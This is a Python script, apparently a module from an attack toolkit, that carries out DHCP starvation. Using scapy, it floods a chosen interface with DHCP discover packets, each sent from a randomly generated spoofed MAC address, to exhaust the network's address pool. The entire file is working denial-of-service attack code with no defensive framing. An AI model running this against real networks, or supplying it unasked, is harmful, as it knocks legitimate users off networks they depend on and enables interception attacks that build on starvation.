#!/usr/bin/env python3
"""
DHCP Starvation Module
Exhaust DHCP pool by requesting multiple IP addresses
"""

import os
import sys
import random
import time
import signal

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, srp, get_if_hwaddr
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

def generate_mac():
    """Generate random MAC address"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def dhcp_request(interface, timeout=5):
    """Send DHCP request"""
    try:
        mac = generate_mac()
        
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/\
                       IP(src="0.0.0.0", dst="255.255.255.255")/\
                       UDP(sport=68, dport=67)/\
                       BOOTP(chaddr=mac, xid=random.randint(0, 0xffffffff))/\
                       DHCP(options=[("message-type", "discover"), "end"])
        
        result = srp(dhcp_discover, iface=interface, timeout=timeout, verbose=False)
        
        if result[0]:
            return True, mac
        return False, mac
    except Exception as e:
        return False, None

def main():
    interface = os.getenv('ARG_INTERFACE')
    count = int(os.getenv('ARG_COUNT', '100'))
    timeout = int(os.getenv('ARG_TIMEOUT', '5'))
    
    if not interface:
        print("Error: interface required")
        sys.exit(1)
    
    print(f"[*] Starting DHCP starvation on {interface}")
    print(f"[*] Count: {count}, Timeout: {timeout}s")
    
    success = 0
    failed = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        elapsed = time.time() - start_time
        print(f"\n[+] Completed: {success} successful, {failed} failed in {elapsed:.2f}s")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        for i in range(count):
            result, mac = dhcp_request(interface, timeout)
            
            if result:
                success += 1
                status = "OK"
            else:
                failed += 1
                status = "FAIL"
            
            print(f"[+] Request {i+1}/{count} [{status}] MAC: {mac}", end='\r')
        
        elapsed = time.time() - start_time
        print(f"\n[+] Completed: {success} successful, {failed} failed in {elapsed:.2f}s")
    except PermissionError:
        print("Error: This requires root/administrator privileges")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
